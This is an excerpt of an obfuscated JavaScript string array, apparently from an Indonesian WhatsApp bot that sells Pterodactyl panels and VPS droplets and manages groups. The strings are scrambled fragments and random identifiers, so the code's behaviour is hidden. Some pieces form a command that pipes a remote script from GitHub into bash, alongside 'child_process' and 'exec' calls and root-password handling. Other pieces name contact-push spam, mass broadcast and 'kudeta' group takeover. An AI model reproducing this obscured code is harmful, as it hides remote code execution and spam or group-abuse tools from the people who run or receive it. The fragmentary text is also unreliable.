        'ᴏʀ\x20:\x20ʀʏᴢᴢɪ',
        '\x20V4',
        '-Theme-Aut',
        'i.cloudfla',
        '\x0a*\x20*Link\x20D',
        'cation/use',
        '\x0aTotal\x20gru',
        'vUNOP',
        '*.startwin',
        'DJtMp',
        'xtGsA',
        'reset',
        '140',
        'pi/ai/open',
        'YQpGs',
        '\x20✅*\x0aTotal\x20',
        'rvJAv',
        't\x20akan\x20oto',
        'groupLeave',
        'ZvYPh',
        'zQwgV',
        'kstatus?ap',
        'save',
        'ZObXY',
        'Nihwc',
        'QWMKu',
        'semua\x20menu',
        'ord\x20:*\x20',
        'Gagal\x20mend',
        'xEvYc',
        'rsedia\x0a',
        'menit\x20pemb',
        'Ram\x2016GB\x20|',
        'ma\x20enigma*',
        '\x0a*🔴\x20INFORM',
        'dFBbb',
        'AHGpz',
        'oaeQQ',
        '𝖤/𝖶𝖠\x20\x0a𝗞𝗘𝗧𝗘',
        'Server\x20pan',
        '4gb',
        'xqHoQ',
        '.ᴄᴇᴋɪᴅᴄʜ\x0a│',
        'art\x20VPS:\x20',
        'bofYS',
        'product',
        'Stderr\x20:\x20',
        'KfhWQ',
        'welcome*\x20d',
        '_18',
        'pating',
        'ʙʏ\x20*ʀʏᴢᴢ*\x0a',
        'Enter\x20the\x20',
        'blic*',
        'Tmnvt',
        '180',
        'WbKtp',
        'ktZUz',
        '100',
        'listpanel',
        'RncHa',
        'kik',
        '\x20ᴍᴇɴɢᴇᴛᴀʜᴜ',
        '10𝖪\x0a>\x20𝖬𝖴𝖱𝖡',
        'Downloader',
        'im\x20media',
        '━━\x20`ᴘᴀɴᴇʟ\x20',
        'ɪᴀғɪʀᴇ\x0a┗━━',
        'ᴇʟ2\x0a┗━━━━━',
        '\x20Ram\x209\x20GB\x20',
        '*\x20\x0aQris\x20pe',
        'aZnDv',
        'iWhBx',
        'TjLdP',
        '2\x0a│\x20↝\x20.3ɢʙ',
        'KnvGx',
        'l\x2015\x20detik',
        'DpSWh',
        'zone',
        'pat\x20kamu\x20p',
        'ngAoz',
        'oWKTm',
        '9gb-v2',
        'MlpkE',
        'RUNGC',
        'CPU\x20120%',
        'bratvideo',
        'Katasandi\x20',
        'KAN*\x0a>\x20SC\x20',
        'kudeta',
        'pixhost.to',
        'und',
        'atabases?\x20',
        'templateBu',
        'PANEL\x20UNLI',
        '│\x20↝\x20.ɪɴsᴛᴀ',
        'pi/downloa',
        'Kybba',
        'rkervcp/yo',
        'IQyKM',
        'qris',
        '\x0aBerikut\x20a',
        'ᴅs\x20>\x0a│\x20↝\x20x',
        'abilling',
        'pembelian\x0a',
        'r\x20✅*',
        'EKhQC',
        'gzgxJ',
        '\x0a\x0a*➡︎\x20Spesi',
        'CcHQe',
        'abase\x20✅',
        'ng\x20tersedi',
        'odactyl\x20✅',
        'pzgwS',
        '𝖦𝖠\x0a>\x20SERVE',
        'isAdmin',
        '━━\x0a│\x20↝\x20.1ɢ',
        'EezDS',
        'enghapus\x20c',
        'write',
        'tent.com/S',
        '\x20\x0a>\x20PANEL\x20',
        'w*\x20sudah\x20a',
        'resetdb',
        'iddroplet',
        'ɢʙ-ᴠ2\x20\x0a│\x20↝',
        'neMfS',
        'mgDLr',
        '\x20ON\x2024JAM\x20',
        'UpabG',
        'skyzopedia',
        'NsJvb',
        'ed\x20:*\x205\x20me',
        'GkSiU',
        'gwCle',
        'ɴ\x20ᴅɪ\x20sᴇʙᴀʀ',
        '\x20hanya\x20ber',
        '\x20ᴛɪᴅᴀᴋ\x20ʀᴀᴡ',
        'etik\x20*.bat',
        'ʟɪsᴛᴀᴅᴍɪɴ\x0a',
        'VkkyA',
        'By\x20',
        's-1vcpu-2g',
        'oNLwz',
        'ᴅᴇᴠᴇʟᴏᴘᴇʀ\x20',
        'rhasil\x20dih',
        '9|17|20|11',
        'eQVZm',
        't\x20:*\x20',
        'gzBxU',
        '\x20.ᴀɪ\x0a│\x20↝\x20.',
        'ession\x0a*',
        'eKobJ',
        'Total\x20*',
        '\x0aJika\x20pemb',
        'Pembelian\x20',
        'ini\x20tidak\x20',
        'juprC',
        'edia/scrip',
        'List\x20Produ',
        'tFEXl',
        'Masukkan\x20j',
        'rebuild!',
        'VDYiu',
        'YKQBX',
        '\x20ke\x20*',
        'root',
        'GJVBn',
        'actyluser)',
        'database/s',
        'temukan',
        '\x20diselesai',
        'buttonsMes',
        '3000',
        'ia.us.kg/a',
        'l\x22:\x22',
        'ᴛsᴇʟʟᴇʀ\x0a│\x20',
        'nOvAW',
        '*\x20member\x20g',
        'Foto\x20Slide',
        'Durasi\x20vid',
        '\x0a*\x20*Durasi',
        'Pilih\x20Admi',
        'k\x20melihat\x20',
        'ght',
        'XoeNM',
        'LBBmk',
        'FBpsQ',
        'i.digitalo',
        'gopay',
        'LxBsP',
        'wZMmD',
        'ument.word',
        'TlAHt',
        '9000',
        'IcTYD',
        'gNkQK',
        'kick',
        'MHfVd',
        'p\x20Telah\x20Be',
        './source/m',
        'Ddqnn',
        'erver\x20Vps',
        'buyscript',
        'dWVCQ',
        '\x27t\x20input\x20a',
        'rname\x20:*\x20a',
        'uNQBs',
        'apkmod',
        'n\x20mengirim',
        'ma!',
        '\x20-\x20𝗖𝗽𝗮𝗻𝗲𝗹\x20',
        'VTQKE',
        '100000)*',
        '/N)',
        'ᴀɴᴇʟ\x0a│\x20↝\x20.',
        'ip_address',
        '2iEsSAFy\x0a',
        'Grup\x20Ini\x20S',
        'Nxvhk',
        '\x0a*\x20*Upload',
        'idgc',
        'eyjFz',
        '@tag/6285#',
        'ejection',
        'Penting\x20:*',
        'error\x20:*\x0a',
        'FAvvg',
        'eys',
        '\x0asᴀʏᴀ\x20ᴅɪʀᴀ',
        'SDKbd',
        'ᴠ2\x0a│\x20↝\x20.6ɢ',
        '𝖤𝖪\x20𝖵𝖯𝖲\x20𝟣𝟨\x20',
        'alkan\x0a',
        'BqOiO',
        'split',
        'bratvid',
        'GMOMd',
        'buPSI',
        '\x20.3ɢʙ-ᴠ2\x0a│',
        'fuZUf',
        's\x20ᴛᴏ`\x20\x20━━━',
        '│\x20↝\x20.sʜᴏʀᴛ',
        'MLkCW',
        'space\x20(dal',
        'mDjGQ',
        'merchantId',
        '/dns_recor',
        'UfmhB',
        'hatsApp_*:',
        'ʟɪsᴛᴀᴅᴍɪɴ-',
        'min\x20panel\x20',
        'aOWuI',
        'tcLur',
        '.r2c1\x20',
        'Rp10000',
        'h\x20Satu\x20Ser',
        'database/c',
        'YgYaj',
        'd!\x0aJika\x20pe',
        'UmNNi',
        'qSviV',
        'nya',
        'eIqtk',
        'YQwQv',
        'now',
        'ctyl\x0aTungg',
        'laEtc',
        'Link\x20Tauta',
        '\x20semua\x20cmd',
        'linkgc',
        'MOUyL',
        'nizpA',
        'euoza',
        'VphGc',
        'WaHYo',
        'AHftQ',
        'OiaTz',
        ')ancel:',
        'Chat',
        'wktOn',
        'decodeJid',
        'bTYiQ',
        'pxClY',
        'plet!',
        '\x0a*➡︎\x20Passwo',
        'dCMkO',
        'kyzodev/Si',
        '\x0a│\x20↝\x20.ʏᴛᴍᴘ',
        'cadmin',
        'util',
        'linkchnya',
        'lkZvy',
        'PANEL\x207GB',
        'JnkdB',
        'TTDKf',
        '\x20detik\x0a*•\x20',
        'choJa',
        '\x20Maaf\x20kamu',
        'DesNu',
        '*\x20kontak',
        'aEvWt',
        'gimage',
        'uninstallp',
        '\x0a➥\x20sᴇʟᴇᴄᴛ\x20',
        '\x20dinyataka',
        '6000',
        '━\x20`ᴛʜᴀɴᴋs\x20',
        'es/',
        'linknya',
        '-officedoc',
        'ʟᴇʀ`\x20\x20━━━━',
        'Connection',
        'eMeta',
        'DvGhl',
        'enchard',
        'yediakan\x20P',
        'HQVEn',
        '15000',
        'Ip\x20/\x20Passw',
        '𝖴𝖦\x20𝖵𝖨𝖠\x20𝖳𝖤𝖫',
        'Terverifik',
        ',\x22url\x22:\x22',
        '\x20membuat\x20s',
        'Nbqvt',
        'Free\x20User',
        'ayaran\x20ber',
        'p.com/IP1K',
        '029Vb5Pb0a',
        'snVxg',
        'sDOlz',
        'rvo',
        'zLAKI',
        'XzIgw',
        'XQBWc',
        'ttonReplyM',
        'ʟɪsᴛᴘᴀɴᴇʟ\x0a',
        '\x20ʙᴇsᴛ\x20ғʀɪᴇ',
        'AllPartici',
        'IzRcc',
        'n\x20:*\x0a*\x20Sim',
        'HeQGE',
        'ᴍᴇɴɪᴛ\x20ᴀɢᴀʀ',
        'DyxBH',
        'pxkam',
        'ubdomain\x20✅',
        'unwatchFil',
        'ᴘᴀɴᴇʟ\x0a│\x20↝\x20',
        'RAM\x202GB\x20|\x20',
        'zlIFg',
        'MpXxY',
        'proses\x20sel',
        'lam\x20privat',
        'an\x20restart',
        'tzBNP',
        'npm',
        '&isVideo=f',
        'fromObject',
        'atalkan\x0a',
        '.buyvps\x202',
        'GhpKm',
        'seconds',
        'CfQDX',
        'groupInvit',
        'membatalka',
        'https://wh',
        'wings',
        'nel\x20whatsa',
        '2000',
        '1|2|0',
        'aifgw',
        'uninstall*',
        'RYnIZ',
        'eplace)\x0a*\x20',
        'Droplet\x20be',
        'vixdH',
        'first_name',
        'at\x20membuat',
        'Ram\x207GB',
        'thub.com/S',
        'XGJpE',
        '│\x20↝\x20.ᴋɪᴄᴋ\x0a',
        'PNsOk',
        '\x20bot\x20✅',
        'ssword)',
        'ɴɢ\x0a│\x20↝\x20.ɪɴ',
        'qmzXX',
        'ngkin\x0a│*\x20G',
        '4|0|3|1|2',
        'bqbsb',
        'u\x201-10\x20men',
        'UElxF',
        'ᴀɪɴ\x0a│\x20↝\x20.s',
        'PMyDT',
        'ZnCnB',
        'KoWgb',
        'WWVaJ',
        'puhyE',
        'blacklistj',
        'timestamp',
        'UtysZ',
        'EyBcO',
        'let:\x20',
        'user_data',
        'TGHJW',
        'log',
        '\x20VPS:\x20',
        'KtgFm',
        '\x20garansi\x20w',
        'ruBrI',
        'UFNkB',
        'onfigure\x20H',
        'l\x20*',
        'zduaP',
        'oSTny',
        '𝖬𝖨𝖭\x20𝖫𝖠𝖭𝖢𝖠𝖱',
        'albeli*\x20un',
        '8gb-v2',
        'cache',
        'ema\x20stella',
        'XWlAK',
        'writeFile',
        'lkqJO',
        'com',
        'kRLHI',
        'ɴ-ᴠ2\x20\x0a│\x20↝\x20',
        '↝\x20.ᴜᴘᴄʜᴀɴɴ',
        'an\x20hanya\x20b',
        'Beli\x20Produ',
        '*pushkonta',
        'GOgKH',
        'pp\x20✅*\x0a*\x20Na',
        '\x20panel\x20(pa',
        'VxSeI',
        'TScrl',
        '1|14|12|15',
        'AMA\x20:*\x20```',
        'ikirim\x20ke\x20',
        'rstdb',
        'zNDEs',
        'sername\x20(p',
        'fIoMN',
        'stickerwm',
        'https://ex',
        'KRdao',
        'up\x20ini\x20tid',
        'trim',
        '\x20.10ɢʙ-ᴠ2\x20',
        '.5ɢʙ-ᴠ2\x0a│\x20',
        'ZoAGy',
        'produk',
        'sg=',
        'pCsks',
        'salahan\x20sa',
        '://raw.git',
        'Ntfze',
        'MEVJm',
        'ifikasi\x20Vp',
        'jadi\x20owner',
        'k\x20grup\x20lai',
        'san\x20*teks*',
        'ʟᴀʜ\x20ᴀssɪsᴛ',
        'wOlmH',
        'ansi\x20wajib',
        'RXumT',
        'KuzRc',
        '*\x0a┃*\x20Disk\x20',
        'UVwrq',
        'image',
        '|16|0|9|5|',
        'wNDcw',
        'GzudN',
        'uEfiZ',
        'CPLVB',
        'Memproses\x20',
        'yways\x20(you',
        'apiDigital',
        'tidak\x20vali',
        'fQxJg',
        'OICE;waid=',
        '\x20VPS\x20:\x20',
        'akan\x20otoma',
        '2gb',
        '*Jpm\x20Telah',
        'getcase',
        '62838###',
        't\x20Detail\x20A',
        'sgp1',
        'avUrz',
        'ta\x0a',
        '.buyvps\x204',
        'ukti\x20chat\x20',
        'isBotAdmin',
        'ezone',
        'ontak',
        'qecpI',
        'qWPJd',
        '\x20Error:\x20',
        'post',
        '\x0a│\x20↝\x20.ᴊᴏɪɴ',
        '\x20`ᴏᴡɴᴇʀ\x20ᴍᴇ',
        'alamat\x20IP\x20',
        'RAM\x2010GB\x20|',
        'sᴛᴏʀᴇ\x20ᴍᴇɴᴜ',
        '.delpanel-',
        'announce',
        '━━━\x20`ᴛʜᴀɴᴋ',
        'ubuntu-20-',
        '\x20owner\x20uta',
        'ʙ-ᴠ2\x0a│\x20↝\x20.',
        'VziAK',
        'not_announ',
        'disk',
        'audio/mpeg',
        'iUeWI',
        'Iqrzn',
        'e\x20with\x20ins',
        '\x20Yang\x20Ters',
        'udah\x20Tidak',
        '\x20{\x20expire:',
        'GDaAT',
        '`\x20━━━━━\x0a│\x20',
        'JDbaG',
        'durations',
        'restart',
        'kABmk',
        '120',
        'ted',
        '*Antilink2',
        'autotyping',
        'HHrPm',
        '\x20↝\x20.9ɢʙ-ᴠ2',
        'ᴍᴀɢᴇ\x0a│\x20↝\x20.',
        'nLQpR',
        '\x20(ID\x20',
        'itemukan!',
        'zihJS',
        '6gb-v2',
        'bash\x20<(cur',
        'iGxzz',
        '\x20||\x20Disk\x20',
        '\x20Admin\x20Pan',
        'm\x20grup\x20*',
        '3gb',
        'nerated\x20pa',
        'dWKrr',
        'rlmDR',
        ':\x20Rp9000\x0a\x0a',
        'oinstaller',
        'RjSkX',
        'ttmp3',
        'randomByte',
        'NojPQ',
        '*\x0a\x0a*IP\x20Ser',
        '!\x20\x0aIni\x20Ada',
        'ʜᴀᴛ\x0a│\x20↝\x20.ʀ',
        'reply\x20pesa',
        'da\x20command',
        'ekEPi',
        'mime',
        'io\x20atau\x20la',
        'AGE:\x20',
        'endsWith',
        '7ɢʙ-ᴠ2\x0a│\x20↝',
        '\x20.ʏᴛs\x0a│\x20↝\x20',
        'asi\x20status',
        'Gppwb',
        'ʟᴀᴅᴍɪɴ-ᴠ2\x20',
        '.panel',
        'rQUlX',
        'VgoOX',
        'LARE\x20\x0a\x0a*WA',
        'cpus',
        'pykVi',
        'listrespon',
        'text/vcard',
        'sendtesti',
        'KgtfZ',
        'g\x20:*\x20Panel',
        'sᴛᴀʟʟᴛᴇᴍᴀᴇ',
        'erver',
        'ePrOl',
        'embatalkan',
        'ᴀɴᴇʟ\x20ᴍᴇɴᴜ\x20',
        'random',
        'n\x20kamu\x20say',
        'gsAns',
        'ilePicture',
        '\x20kick,\x20kar',
        'nfQVD',
        'eqrSa',
        'lsEUR',
        'CcVnj',
        'delseller',
        'zZApV',
        'XDEsa',
        'lah\x20menyal',
        '━━━━━\x20`sᴇᴀ',
        '\x0a*Subdomai',
        'DpCGv',
        'exec',
        'buttons',
        'ulYgl',
        'WiugD',
        'vucBh',
        'imAtA',
        'wYHHO',
        'REfXr',
        'toSWR',
        'ʟɪɴᴋ\x0a│\x20↝\x20.',
        '\x22,\x22merchan',
        'jxkiT',
        'rQmNa',
        'child_proc',
        'filter',
        'bmRII',
        'ni\x20tidak\x20a',
        'ᴍɪʟʏ\x20<\x20sᴜᴘ',
        'GGbFk',
        'Dwsws',
        'HopVG',
        'Reseller\x20P',
        'for\x20Let\x27s\x20',
        'text\x22:\x22Cha',
        'JMqrN',
        'MnThE',
        'TuYkT',
        'off',
        'r8c4',
        'e.com)',
        'ANgJI',
        '\x20Downloade',
        'Panel',
        'onfigure\x20U',
        'iZaDC',
        '&merchant=',
        'jXvBe',
        'lgwhF',
        'ᴛᴇ\x0a│\x20↝\x20.ᴛᴏ',
        'readviewon',
        '\x20appropria',
        'kyzoOffc/P',
        'tXrYe',
        'ilbxP',
        'https://wa',
        'reboot',
        'newsletter',
        'respon',
        'floor',
        'CZDXD',
        'QevqC',
        'ARAN*\x0a\x20\x20\x0a\x20',
        'extendedTe',
        'fjzHY',
        'cdToQ',
        'IMRoh',
        'ame\x20(panel',
        'fiWmX',
        'TERVERIFIK',
        'cmfLJ',
        '\x20=>',
        'dactyl',
        'yt-search',
        'listgrup',
        'writeFileS',
        '\x20V5',
        'VFnva',
        'OURTH\x20]',
        'zarwF',
        'rodactyl\x0aT',
        'NT\x20TO\x20BUY?',
        'AbwtB',
        'CHcde',
        'aOGJF',
        'install\x20*t',
        'y/lemot!_\x0a',
        'JWPaW',
        'jyqXE',
        'ASI\x20PEMBAY',
        'rypt?\x20(y/N',
        'mmSPf',
        'BBgpR',
        'teksnya',
        'lace\x20:*\x0a',
        'jO4OyM97ay',
        'then',
        'STDERR:\x20',
        'ayaran\x20din',
        'dress\x20that',
        'Khusus\x20pre',
        'hNAoN',
        'nya\x20bisa\x20d',
        '.r8c4\x20',
        'ʀᴄʜ\x20ᴍᴇɴᴜ`\x20',
        'MfeVU',
        'WCUJO',
        'ode\x20Yang\x20S',
        'ID\x20User\x20(',
        '3gb-v2',
        'nel\x20pterod',
        'ᴠᴇʟᴏᴘᴇʀ\x20>\x0a',
        'isGroup',
        'toUpperCas',
        '@tag/nomor',
        '.dana',
        'OOXBJ',
        'uleuW',
        'sisadrople',
        'rWasm',
        'di\x20grup\x20in',
        'ɴsᴛᴀʟʟᴛᴇᴍᴀ',
        'unli-v2',
        'n\x20Tidak\x20Va',
        'HFmPV',
        'xzokd',
        'Error:',
        '↝\x20.ɪɴsᴛᴀʟʟ',
        'tiktokmp3',
        '━━━━━━━\x0a\x20\x20',
        'Error\x20:',
        'replace',
        '↝\x20.1ɢʙ-ᴠ2\x0a',
        'olqNA',
        'CRYBL',
        'ARZHy',
        'cvHJg',
        '\x0a*🔐\x20Passwo',
        'YtAtG',
        '.allmenu',
        'te\x20akun\x20no',
        'jMEfw',
        '\x20GB\x0a*•\x20Tot',
        'gvavI',
        'tliof',
        '1gb-v2',
        'cmd\x20respon',
        '\x20↝\x20.ᴄᴇᴋɪᴅɢ',
        '\x20CPU\x202',
        'Pilih\x20Menu',
        '45000',
        'vRJDj',
        'nit\x0a\x0a*Note',
        'we\x20dont\x20ta',
        'vps',
        '\x20respon',
        '━━━━━━\x0a\x0a┏━',
        's|token_no',
        'PkioD',
        'hNYuB',
        '&\x20ᴊᴜɢᴀ\x20ᴋᴇʙ',
        'sticker',
        '𝗿𝗲\x20⌟',
        '\x0aRam:\x20',
        'pt\x20Bot',
        'listserver',
        'hat\x20pembel',
        'yzo\x0a',
        'd\x20:\x20',
        't/servers/',
        'error',
        'id\x20good\x20ni',
        '\x20server\x20pa',
        'ᴏᴘᴇʀ\x20ᴀɢᴀʀ\x20',
        'mzlZi',
        'plJWP',
        'ACaNa',
        'dak\x20valid!',
        'groupMetad',
        'nId',
        'XCxbY',
        'listown',
        'OWgnh',
        'dak\x20Ditemu',
        'MnAhv',
        '10gb\x20',
        'pengikut\x20:',
        'buttonsRes',
        'botname2',
        'HEXOx',
        'idgrupnya',
        'ᴛᴇᴍᴀ\x0a┗━━━━',
        'zcjga',
        './session/',
        'MegSk',
        'BpIwN',
        'IJrBv',
        '0|2',
        'HYwsY',
        'MdLny',
        'ninstall\x20S',
        'yellow',
        'pzRVS',
        'mdZyr',
        'na\x20admin/o',
        'wjqEN',
        'QrCRx',
        '\x20↝\x20.sᴜʙᴅᴏᴍ',
        'GBsQY',
        'sᴘᴏɴ\x0a│\x20↝\x20.',
        'contacts.v',
        '.net',
        'ver\x20Panel\x0a',
        '©\x20Menu',
        'ᴇʀ\x0a│\x20↝\x20.ᴅᴇ',
        'hXmDa',
        '𝖤𝖱\x20𝖯𝖠𝖭𝖤𝖫\x201',
        'ikey=',
        'nIGjO',
        'YzyHC',
        'ezWOf',
        '┏━━━━━\x20`ᴛᴏ',
        '#cloud-con',
        'im\x20notifik',
        'namamu\x20den',
        'Body',
        'RXNRy',
        'HMWIN',
        'JeoHv',
        't\x20hingga\x20p',
        'lHtXw',
        'wDzjZ',
        'Jshgv',
        '|22|6|7|10',
        'RAM\x206GB\x20|\x20',
        'QIWDm',
        'Pilih\x20Serv',
        'ɴᴜ`\x20\x20━━━━━',
        'ahan',
        'actyl*\x0a',
        'inyatakan\x20',
        'MSuni',
        'astellar',
        'toLowerCas',
        'DANA\x20',
        'ffrJU',
        'VRoHJ',
        '\x20↝\x20ᴍᴏᴅᴇ\x20:\x20',
        'oni\x20ke\x20dal',
        '\x0aStorage:\x20',
        'f&url=',
        'updateProf',
        'eMLTD',
        'arraybuffe',
        'ORMsv',
        'DafYa',
        'rup\x20ini',
        'nnya',
        'qWxgF',
        'unli\x20',
        'ly\x20file\x20.j',
        'llIlh',
        'sʜᴏʀᴛʟɪɴᴋ\x0a',
        'arna\x20admin',
        'domain',
        '⌜\x20𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽',
        'Recommende',
        'google.com',
        'JJaWO',
        'JNOol',
        '3|5|4|7|8|',
        'user\x20resel',
        'Password\x20f',
        'sEmPd',
        'Sisa\x20dropl',
        '10000',
        'uto\x20Respon',
        'll)',
        '©\x202024\x20',
        'ZesWR',
        '\x20Silahkan\x20',
        '\x20reff!\x0a',
        'Tidak\x20bisa',
        'DvoTo',
        'ᴘʀᴏsᴇs\x0a│\x20↝',
        'WlpTR',
        'l\x20-s\x20https',
        '𝖨𝖭\x20𝖫𝖠𝖭𝖢𝖠𝖱\x20',
        'sender',
        '/𝖶𝖠\x20\x0a𝗞𝗘𝗧𝗘𝗥',
        '```Wajib\x20k',
        'nKSZM',
        'bold',
        'rpKYi',
        'toString',
        '✅*\x0a\x0a*𝗥𝘆𝘇𝘇𝗜',
        'ver*\x0a*\x20Ram',
        'shorturl',
        '\x20ocean\x20kam',
        '\x20server!\x0a*',
        'LDWIR',
        'FAGJx',
        '𝘇𝘇𝗜𝘀𝗛𝗲𝗿𝗲-A',
        'node',
        'Input\x200-6',
        'DELETE',
        'ᴀᴘ\x20ᴊᴇᴅᴀ\x205\x20',
        'NvuOX',
        'IytDB',
        'HhirN',
        'tUnhb',
        'ot\x20',
        'rHOIl',
        'seMessage',
        'vWore',
        'formasi\x20VP',
        'kan,\x20ketik',
        'IqBNj',
        'JiBZL',
        'FW\x20(firewa',
        'toFixed',
        'me\x20(pterod',
        '879d3.jpg',
        'kStatus',
        '⌜\x20𝐂𝐏𝐚𝐧𝐞𝐥\x20⌟',
        '\x0a*\x20_Server',
        'bpXsA',
        '\x0a*ʜᴀɪɪ*\x20@',
        'a.me/62813',
        'cUbjI',
        'osDyY',
        'text\x22:\x22Wha',
        'essage',
        'sudah\x20tran',
        'MB):\x20',
        'idDeposit',
        'nything):',
        'vvwyF',
        'bWRfH',
        'MVhhs',
        'rKGnY',
        'clc',
        'thtOA',
        'List\x20Admin',
        'link',
        '=524de9dbd',
        'rvkki',
        'THYJy',
        'sama```\x0a',
        'FRbZu',
        'UVAoH',
        'node-fetch',
        'OVO\x20',
        'users',
        'RXEaf',
        'vJDiH',
        'delayJpm',
        'alakan\x20fit',
        '.png',
        'Ywtyb',
        'JxVyw',
        'pinterest',
        '.gopay',
        'dikirim\x20ke',
        'fXVyS',
        'NrBjv',
        'duration',
        'groupSetti',
        'restartvps',
        'wner.json',
        'informasi\x20',
        '\x0aUsername:',
        'e\x20private\x20',
        '*Facebook\x20',
        '\x0aSYSTEM\x20IM',
        'BhLpe',
        'ZOUms',
        '\x20for\x20any\x20a',
        'e32d81a7d5',
        'PANEL\x203GB',
        'ITzpl',
        'video/mp4',
        'Update\x20',
        'rl=',
        'PmacK',
        'sᴇʟʟᴇʀ\x0a│\x20↝',
        'hbpanel',
        '𝖠\x0a>\x20SERVER',
        'conversati',
        'ka\x20sudah\x20m',
        './settings',
        'emukan\x0aket',
        'Efpua',
        'caHKY',
        'ly/kirim\x20v',
        '\x20CPU\x201',
        'ʟʟᴛᴇᴍᴀsᴛᴇʟ',
        'PANEL\x202GB',
        'ssweb',
        'addowner',
        'JbtPT',
        'kvQOH',
        'hot.js',
        '@tag/reply',
        './package.',
        '\x20auto\x20dele',
        't_url\x22:\x22ht',
        'length',
        'ᴏʟs\x20ᴍᴇɴᴜ`\x20',
        'yReZc',
        'NTVpz',
        'vjUmd',
        'getsc',
        '*\x0a*\x20Nama\x20:',
        'title',
        'TGwvb',
        'dAUrr',
        'ᴍᴇɴᴜ\x20ʀᴇsᴇʟ',
        'Domain\x20tid',
        'MAwCj',
        'untuk\x20memb',
        'readFileSy',
        'RbAzD',
        'Database\x20n',
        '3470PiFtRL',
        'ocid:\x20',
        '\x20Command\x20:',
        '━━━━\x0a\x0a┏━━━',
        'yvkxC',
        'adcast',
        'MAUfm',
        'aik\x20mungki',
        'UVWXYZabcd',
        'rPdeh',
        'ENwff',
        'espon*\x20unt',
        'account',
        '(1x\x20replac',
        'carian\x20dar',
        '0\x0a\x0a*\x20Ram\x203',
        'pPzhd',
        'zIUuZ',
        'wings\x20:\x20*a',
        'Ram\x201GB',
        'transactio',
        'FFkhO',
        'interactiv',
        '>\x0a│\x20↝\x20ᴀʟʟᴀ',
        'database/o',
        'cation/ser',
        'Zslrr',
        'VERIFIED',
        'ess',
        'play',
        'cmd|respon',
        'rhasil\x20🏴‍☠️',
        'resetlinkg',
        'nPAkU',
        'sfer\x20mohon',
        'ɴᴅs\x20>\x0a│\x20↝\x20',
        '.ᴇɴᴄ\x0a│\x20↝\x20.',
        'OfLzD',
        'er\x20demi\x20ke',
        'enghapus\x20a',
        'unlinkSync',
        '\x20*(contoh\x20',
        'TCNtF',
        'rname\x20:*\x20',
        'slug',
        '\x20𝖦𝖡\x0a>\x20𝖯𝖤𝖱𝖬',
        '*Autoreads',
        'wkNCg',
        'qGMDC',
        'subjectOwn',
        'gxomP',
        '.space/?te',
        'untime\x20Vps',
        'String',
        'channel\x20wh',
        'RJKqI',
        'ᴋᴏɴᴛᴀᴋ2\x0a│\x20',
        'OYqKe',
        'ekdSW',
        'upch',
        'gFmsv',
        '\x20.ssᴡᴇʙ\x0a│\x20',
        'dengan\x20kir',
        'uncaughtEx',
        'n/json',
        'ObizG',
        's-4vcpu-16',
        'ma\x20stellar',
        'qdzJN',
        'cEJEe',
        'chatModify',
        '2|1|4|0|3',
        'NdjXF',
        '(y/N)',
        '*Mute*\x20di\x20',
        'ambilq',
        'text\x22:\x22Lin',
        '|ramserver',
        '.buyvps',
        'semua\x20cmd',
        'antilink2',
        'el\x20Yang\x20Te',
        'Simpan\x20dat',
        'it\x20hingga\x20',
        'Ram\x208GB',
        'facebook',
        'vJcsW',
        'Gagal\x20meng',
        'ʀᴇsᴛᴀʀᴛᴠᴘs',
        'er\x20Panel',
        'content-di',
        'uqwDi',
        'ta\x20akun\x20di',
        '\x20https://w',
        '━━\x0a\x0a┏━━━━━',
        'ksi*\x0a\x0a@',
        'l\x20address\x20',
        'i\x20*pintere',
        'umlah\x20maks',
        'CPU\x2080%',
        'ergabung\x20k',
        'gCszx',
        'sedia\x0a',
        'CwfUP',
        '*\x0a\x20*',
        '\x20.ʟɪsᴛɢᴄ\x0a│',
        'List\x20Ram\x20&',
        'ti\x20drama/m',
        '*blacklist',
        'RAM\x209GB\x20|\x20',
        'al\x20Private',
        'eseller\x20✅',
        '\x20&\x20',
        'YaTkJ',
        'rwJcU',
        'LZOZi',
        'CIZiP',
        'unlimited',
        'NANvo',
        'autoreadsw',
        'bOqxe',
        'session',
        'charAt',
        'Tidak\x20Ada\x20',
        'demote',
        'listseller',
        '*𝗥𝘆𝘇𝘇𝗜𝘀𝗛𝗲𝗿',
        'ᴋɢᴄ\x0a│\x20↝\x20.ʟ',
        'enting\x20:*\x20',
        '\x0a│\x20↝\x20.ᴘᴜsʜ',
        'laku\x20dalam',
        'KglVX',
        'ᴛᴇᴍᴀᴇɴɪɢᴍᴀ',
        'YsRsC',
        'WeqEH',
        'e\x20mode\x20*pu',
        'Tidak\x20ada\x20',
        'backup\x20scr',
        'xPkLi',
        '(async\x20()\x20',
        'performanc',
        'n\x20tidak\x20va',
        'ldgdZ',
        'info',
        'ZnACq',
        '\x20dari\x20grup',
        'lORyw',
        'atau\x20IP\x20ti',
        'rfZsb',
        'ThOAg',
        'DnoSQ',
        '.\x0a\x0aKetik\x20*',
        'RnJYi',
        'xetjd',
        'LIqRx',
        'EOoOh',
        'UladE',
        'VSXyr',
        'pm*\x20di\x20gru',
        'TZGHc',
        'EeZvl',
        'jsLfj',
        'EFHDZ',
        'slice',
        'g\x20Tersedia',
        'pELZD',
        'KDWSY',
        'hing\x20dropl',
        'skyzodev\x0a',
        'CfjdQ',
        'SOyFe',
        'LyoBP',
        'vdcHi',
        'UZuqq',
        'WIfab',
        'List\x20Payme',
        'on/off',
        'YtvmP',
        'Esriw',
        '\x20menit,\x20ji',
        'PTDoh',
        'aNxYg',
        'forEach',
        'allmenu',
        'vXwpm',
        'tDCWZ',
        'embelian',
        'si-brat.hf',
        'Script\x20Sim',
        'yang\x20terse',
        'ʟʏ\x20<\x20sᴜᴘᴘᴏ',
        '\x20pembelian',
        '.\x20.',
        'ALhgG',
        'XrLTp',
        'unli',
        'roduk\x20&\x20Ja',
        'up\x20Ini',
        'xnVCj',
        'idio',
        'ekGnS',
        '10.000\x0a\x0a*S',
        'gga\x20proses',
        '━━━━━━━━━━',
        '*\x0a*\x20Total\x20',
        'vCbWu',
        'ᴏʀᴛ\x20>\x0a┗━━━',
        's\x20:\x20(',
        'sHAwT',
        'DvcKt',
        'hgLUM',
        'detag',
        'oplet:\x20',
        'mbayaran\x20b',
        'linkOwner',
        'ent/v4/zon',
        'ID\x20Server\x20',
        '0@s.whatsa',
        'wgHPm',
        'ᴀ\x20:\x20@',
        'rs/',
        'ᴇɴᴛ\x20*ᴇᴠᴏᴜʀ',
        'zeTLG',
        'Runtime\x20Bo',
        '*\x20_Script\x20',
        '0|1|4|3|2',
        'er\x20bot!',
        'data',
        '\x20-\x20Marketp',
        'IJDMb',
        'eihkd',
        'reply',
